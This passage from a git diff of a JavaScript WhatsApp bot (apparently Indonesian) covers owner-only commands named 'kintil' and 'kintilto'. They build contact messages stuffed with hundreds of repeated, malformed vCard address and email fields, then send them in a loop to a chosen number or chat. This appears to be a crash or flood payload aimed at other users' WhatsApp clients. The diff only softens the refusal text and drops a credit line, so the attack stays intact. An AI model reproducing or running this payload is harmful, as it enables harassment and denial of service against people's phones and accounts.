karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
@@ -5435,19 +5526,19 @@ await m.reply(`Berhasil Mengirim Kontol Di Nomer ${text}`)
 }
 break
 case 'kintil': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(m.chat, global.premium, fkontaak)
 }
 }
 break
 case 'kintilto': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 